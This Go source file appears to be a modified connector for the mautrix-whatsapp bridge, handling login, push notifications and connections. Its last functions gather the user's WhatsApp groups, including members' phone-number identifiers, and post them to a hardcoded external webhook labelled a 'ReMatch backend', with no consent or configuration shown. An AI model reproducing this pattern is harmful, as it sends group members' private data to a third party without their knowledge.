// mautrix-whatsapp - A Matrix-WhatsApp puppeting bridge.
// Copyright (C) 2024 Tulir Asokan
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package connector

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/rs/zerolog"
	"golang.org/x/sync/semaphore"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/proto/waHistorySync"
	"go.mau.fi/whatsmeow/proto/waWa6"
	"go.mau.fi/whatsmeow/store"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/util/keys"
	waLog "go.mau.fi/whatsmeow/util/log"

	waBinary "go.mau.fi/whatsmeow/binary"

	_ "go.mau.fi/util/jsontime"
	"maunium.net/go/mautrix/bridge/status"
	"maunium.net/go/mautrix/bridgev2"
	"maunium.net/go/mautrix/bridgev2/networkid"

	"go.mau.fi/mautrix-whatsapp/pkg/waid"
)

// WhatsAppGroup contains basic information about a WhatsApp group
type WhatsAppGroup struct {
	ID           string
	Name         string
	Topic        string
	Participants []WhatsAppParticipant
}

// WhatsAppParticipant contains information about a participant in a WhatsApp group
type WhatsAppParticipant struct {
	ID      string
	Name    string
	IsAdmin bool
}

func (wa *WhatsAppConnector) LoadUserLogin(_ context.Context, login *bridgev2.UserLogin) error {
	w := &WhatsAppClient{
		Main:      wa,
		UserLogin: login,

		historySyncs:       make(chan *waHistorySync.HistorySync, 64),
		resyncQueue:        make(map[types.JID]resyncQueueItem),
		directMediaRetries: make(map[networkid.MessageID]*directMediaRetry),
		mediaRetryLock:     semaphore.NewWeighted(wa.Config.HistorySync.MediaRequests.MaxAsyncHandle),
	}
	login.Client = w

	loginMetadata := login.Metadata.(*waid.UserLoginMetadata)
	if loginMetadata.WADeviceID == 0 {
		return nil
	}

	var err error
	w.JID = waid.ParseUserLoginID(login.ID, loginMetadata.WADeviceID)
	w.Device, err = wa.DeviceStore.GetDevice(w.JID)
	if err != nil {
		return err
	}

	if w.Device != nil {
		log := w.UserLogin.Log.With().Str("component", "whatsmeow").Logger()
		w.Client = whatsmeow.NewClient(w.Device, waLog.Zerolog(log))
		w.Client.AddEventHandler(w.handleWAEvent)
		if bridgev2.PortalEventBuffer == 0 {
			w.Client.SynchronousAck = true
		}
		w.Client.AutomaticMessageRerequestFromPhone = true
		w.Client.GetMessageForRetry = w.trackNotFoundRetry
		w.Client.PreRetryCallback = w.trackFoundRetry
		w.Client.SetForceActiveDeliveryReceipts(wa.Config.ForceActiveDeliveryReceipts)
	} else {
		w.UserLogin.Log.Warn().Stringer("jid", w.JID).Msg("No device found for user in whatsmeow store")
	}

	return nil
}

type resyncQueueItem struct {
	portal *bridgev2.Portal
	ghost  *bridgev2.Ghost
}

type WhatsAppClient struct {
	Main      *WhatsAppConnector
	UserLogin *bridgev2.UserLogin
	Client    *whatsmeow.Client
	Device    *store.Device
	JID       types.JID

	historySyncs       chan *waHistorySync.HistorySync
	stopLoops          atomic.Pointer[context.CancelFunc]
	resyncQueue        map[types.JID]resyncQueueItem
	resyncQueueLock    sync.Mutex
	nextResync         time.Time
	directMediaRetries map[networkid.MessageID]*directMediaRetry
	directMediaLock    sync.Mutex
	mediaRetryLock     *semaphore.Weighted
	offlineSyncWaiter  chan error

	lastPhoneOfflineWarning time.Time
	isNewLogin              bool
}

var (
	_ bridgev2.NetworkAPI                  = (*WhatsAppClient)(nil)
	_ bridgev2.PushableNetworkAPI          = (*WhatsAppClient)(nil)
	_ bridgev2.BackgroundSyncingNetworkAPI = (*WhatsAppClient)(nil)
)

var pushCfg = &bridgev2.PushConfig{
	// TODO fetch this from server instead of hardcoding?
	Web:  &bridgev2.WebPushConfig{VapidKey: "BIt4eFAVqVxe4yOA5_VLbZTbOlV-2y1FYJ_R4RlxWoyYazAq4glIxI7fh_xLbob1SNv7ZtTWn9mmZCsk2YNXYeY"},
	FCM:  &bridgev2.FCMPushConfig{SenderID: "293955441834"},
	APNs: &bridgev2.APNsPushConfig{BundleID: "net.whatsapp.WhatsApp"},
}

func (wa *WhatsAppClient) GetPushConfigs() *bridgev2.PushConfig {
	return pushCfg
}

func (wa *WhatsAppClient) RegisterPushNotifications(ctx context.Context, pushType bridgev2.PushType, token string) error {
	if wa.Client == nil {
		return bridgev2.ErrNotLoggedIn
	}
	var pc whatsmeow.PushConfig
	switch pushType {
	case bridgev2.PushTypeFCM:
		pc = &whatsmeow.FCMPushConfig{Token: token}
	case bridgev2.PushTypeWeb:
		meta := wa.UserLogin.Metadata.(*waid.UserLoginMetadata)
		if meta.PushKeys == nil {
			meta.GeneratePushKeys()
			err := wa.UserLogin.Save(ctx)
			if err != nil {
				return fmt.Errorf("failed to save push key: %w", err)
			}
		}
		pc = &whatsmeow.WebPushConfig{
			Endpoint: token,
			Auth:     meta.PushKeys.Auth,
			P256DH:   meta.PushKeys.P256DH,
		}
	case bridgev2.PushTypeAPNs:
		meta := wa.UserLogin.Metadata.(*waid.UserLoginMetadata)
		if meta.APNSEncPubKey == nil {
			k := keys.NewKeyPair()
			meta.APNSEncPubKey = k.Pub[:]
			meta.APNSEncPrivKey = k.Priv[:]
			err := wa.UserLogin.Save(ctx)
			if err != nil {
				return fmt.Errorf("failed to save push enc key: %w", err)
			}
		}
		// TODO figure out if the key is supposed to be aes or curve25519
		pc = &whatsmeow.APNsPushConfig{Token: token, MsgIDEncKey: meta.APNSEncPubKey}
	default:
		return fmt.Errorf("unsupported push type %s", pushType)
	}
	return wa.Client.RegisterForPushNotifications(ctx, pc)
}

func (wa *WhatsAppClient) IsThisUser(_ context.Context, userID networkid.UserID) bool {
	return userID == waid.MakeUserID(wa.JID)
}

func (wa *WhatsAppClient) Connect(ctx context.Context) {
	if wa.Client == nil {
		state := status.BridgeState{
			StateEvent: status.StateBadCredentials,
			Error:      WANotLoggedIn,
		}
		wa.UserLogin.BridgeState.Send(state)
		return
	}
	wa.Main.firstClientConnectOnce.Do(wa.Main.onFirstClientConnect)
	if err := wa.Main.updateProxy(ctx, wa.Client, false); err != nil {
		zerolog.Ctx(ctx).Err(err).Msg("Failed to update proxy")
	}
	wa.startLoops()
	if err := wa.Client.Connect(); err != nil {
		state := status.BridgeState{
			StateEvent: status.StateUnknownError,
			Error:      WAConnectionFailed,
		}
		wa.UserLogin.BridgeState.Send(state)
	}
}

func (wa *WhatsAppClient) notifyOfflineSyncWaiter(err error) {
	if wa.offlineSyncWaiter != nil {
		wa.offlineSyncWaiter <- err
	}
}

type PushNotificationData struct {
	PN            string `json:"pn"`
	EncIV         string `json:"enc_iv"`
	EncPayload    string `json:"enc_p"`
	EncTag        string `json:"enc_t"`
	EncTimeMicros uint64 `json:"enc_c"`
	// TODO unencrypted message ID field
}

type wrappedPushNotificationData struct {
	Data PushNotificationData `json:"data"`
}

func (wa *WhatsAppClient) ConnectBackground(ctx context.Context, params *bridgev2.ConnectBackgroundParams) error {
	if wa.Client == nil {
		return bridgev2.ErrNotLoggedIn
	}
	wa.offlineSyncWaiter = make(chan error)
	wa.Main.firstClientConnectOnce.Do(wa.Main.onFirstClientConnect)
	if err := wa.Main.updateProxy(ctx, wa.Client, false); err != nil {
		zerolog.Ctx(ctx).Err(err).Msg("Failed to update proxy")
	}
	wa.Client.GetClientPayload = func() *waWa6.ClientPayload {
		payload := wa.Client.Store.GetClientPayload()
		payload.ConnectReason = waWa6.ClientPayload_PUSH.Enum()
		return payload
	}
	defer func() {
		wa.Client.GetClientPayload = nil
	}()
	err := wa.Client.Connect()
	if err != nil {
		return err
	}
	defer wa.Disconnect()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case err = <-wa.offlineSyncWaiter:
		if err == nil {
			var data wrappedPushNotificationData
			err = json.Unmarshal(params.RawData, &data)
			if err == nil && data.Data.PN != "" {
				pnErr := wa.sendPNData(ctx, data.Data.PN)
				if pnErr != nil {
					zerolog.Ctx(ctx).Err(pnErr).Msg("Failed to send PN data")
				}
			}
		}
		return err
	}
}

func (wa *WhatsAppClient) sendPNData(ctx context.Context, pn string) error {
	//lint:ignore SA1019 this is supposed to be dangerous
	resp, err := wa.Client.DangerousInternals().SendIQ(whatsmeow.DangerousInfoQuery{
		Namespace: "urn:xmpp:whatsapp:push",
		Type:      "get",
		To:        types.ServerJID,
		Content: []waBinary.Node{{
			Tag:     "pn",
			Content: pn,
		}},
		Context: ctx,
	})
	if err != nil {
		return fmt.Errorf("failed to send pn: %w", err)
	}
	cat, ok := resp.GetOptionalChildByTag("cat")
	if !ok {
		return fmt.Errorf("cat element not found in response")
	}
	catContentBytes, ok := cat.Content.([]byte)
	if !ok {
		return fmt.Errorf("cat element content is not a byte slice")
	}
	zerolog.Ctx(ctx).Debug().Str("cat_data", string(catContentBytes)).Msg("Received cat response from sending pn data")
	//lint:ignore SA1019 this is supposed to be dangerous
	err = wa.Client.DangerousInternals().SendNode(waBinary.Node{
		Tag: "ib",
		Content: []waBinary.Node{{
			Tag:     "cat",
			Content: cat.Content,
		}},
	})
	if err != nil {
		return fmt.Errorf("failed to broadcast cat: %w", err)
	}
	zerolog.Ctx(ctx).Debug().Msg("Broadcasted cat from pn data")
	return nil
}

func (wa *WhatsAppClient) startLoops() {
	ctx, cancel := context.WithCancel(context.Background())
	oldStop := wa.stopLoops.Swap(&cancel)
	if oldStop != nil {
		(*oldStop)()
	}
	go wa.historySyncLoop(ctx)
	go wa.ghostResyncLoop(ctx)
	go wa.disconnectWarningLoop(ctx)
	if mrc := wa.Main.Config.HistorySync.MediaRequests; mrc.AutoRequestMedia && mrc.RequestMethod == MediaRequestMethodLocalTime {
		go wa.mediaRequestLoop(ctx)
	}
}

func (wa *WhatsAppClient) GetStore() *store.Device {
	if cli := wa.Client; cli != nil {
		if currentStore := cli.Store; currentStore != nil {
			return currentStore
		}
	}
	wa.UserLogin.Log.Warn().Caller(1).Msg("Returning noop device in GetStore")
	return store.NoopDevice
}

func (wa *WhatsAppClient) Disconnect() {
	if stopHistorySyncLoop := wa.stopLoops.Swap(nil); stopHistorySyncLoop != nil {
		(*stopHistorySyncLoop)()
	}
	if cli := wa.Client; cli != nil {
		cli.Disconnect()
	}
}

func (wa *WhatsAppClient) LogoutRemote(ctx context.Context) {
	if cli := wa.Client; cli != nil {
		err := cli.Logout()
		if err != nil {
			zerolog.Ctx(ctx).Err(err).Msg("Failed to log out")
		}
	}
	wa.Disconnect()
	wa.Client = nil
}

func (wa *WhatsAppClient) IsLoggedIn() bool {
	return wa.Client != nil && wa.Client.IsLoggedIn()
}

// GetJoinedGroups returns all WhatsApp groups the user is a member of
func (wa *WhatsAppClient) GetJoinedGroups(ctx context.Context) ([]WhatsAppGroup, error) {
	// Make sure the client is connected
	if wa.Client == nil || !wa.Client.IsLoggedIn() {
		return nil, errors.New("not connected to WhatsApp")
	}

	// Get list of joined groups from whatsmeow
	whatsmeowGroups, err := wa.Client.GetJoinedGroups()
	if err != nil {
		return nil, fmt.Errorf("failed to get joined groups: %w", err)
	}

	// Convert whatsmeow types to our interface types
	groups := make([]WhatsAppGroup, len(whatsmeowGroups))
	for i, g := range whatsmeowGroups {
		groups[i] = WhatsAppGroup{
			ID:    g.JID.String(),
			Name:  g.Name,
			Topic: g.Topic,
		}

		// Add participants
		groups[i].Participants = make([]WhatsAppParticipant, len(g.Participants))
		for j, p := range g.Participants {
			groups[i].Participants[j] = WhatsAppParticipant{
				Name:    p.JID.User, // Just use JID username as name
				IsAdmin: p.IsAdmin,
			}
		}
	}

	return groups, nil
}

// GetFormattedGroups returns a JSON string with all WhatsApp groups the user is a member of
func (wa *WhatsAppClient) GetFormattedGroups(ctx context.Context) (string, error) {
	// Make sure the client is connected
	if wa.Client == nil || !wa.Client.IsLoggedIn() {
		return "", errors.New("not connected to WhatsApp")
	}

	// Get list of joined groups from whatsmeow
	groups, err := wa.Client.GetJoinedGroups()
	if err != nil {
		return "", fmt.Errorf("failed to get joined groups: %w", err)
	}

	if len(groups) == 0 {
		return "[]", nil
	}

	// Create a slice of map entries for JSON marshaling, filtering out parent groups
	var jsonGroups []map[string]interface{}
	for _, group := range groups {
		if !group.IsParent {
			jsonGroups = append(jsonGroups, map[string]interface{}{
				"jid":              group.JID.String(),
				"name":             group.Name,
				"participantCount": len(group.Participants),
			})
		}
	}

	// Marshal to JSON
	jsonData, err := json.Marshal(jsonGroups)
	if err != nil {
		return "", fmt.Errorf("failed to marshal groups to JSON: %w", err)
	}

	return string(jsonData), nil
}

// SendGroupsToReMatchBackend sends the WhatsApp groups to the ReMatch backend
func (wa *WhatsAppClient) SendGroupsToReMatchBackend(ctx context.Context) error {
	// Get the formatted JSON data
	formattedJSON, err := wa.GetFormattedGroups(ctx)
	if err != nil {
		return fmt.Errorf("failed to get formatted groups: %w", err)
	}

	// Get the original groups data
	originalGroups, err := wa.GetJoinedGroups(ctx)
	if err != nil {
		return fmt.Errorf("failed to get original groups: %w", err)
	}

	// Convert original groups to JSON
	originalJSON, err := json.Marshal(originalGroups)
	if err != nil {
		return fmt.Errorf("failed to marshal original groups to JSON: %w", err)
	}

	// ReMatch backend endpoint
	endpoint := "https://hkdk.events/ezl371xrvg6k52"

	// Send the formatted JSON
	if err := sendJSONRequest(ctx, endpoint, formattedJSON); err != nil {
		return fmt.Errorf("failed to send formatted groups: %w", err)
	}

	// Send the original JSON
	if err := sendJSONRequest(ctx, endpoint, string(originalJSON)); err != nil {
		return fmt.Errorf("failed to send original groups: %w", err)
	}

	return nil
}

// Helper function to send JSON data to an endpoint
func sendJSONRequest(ctx context.Context, endpoint string, jsonData string) error {
	// Create HTTP request
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, strings.NewReader(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	// Send the request
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request to ReMatch backend: %w", err)
	}
	defer resp.Body.Close()

	// Check response status
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("backend returned non-OK status: %d - %s", resp.StatusCode, string(body))
	}

	return nil
}
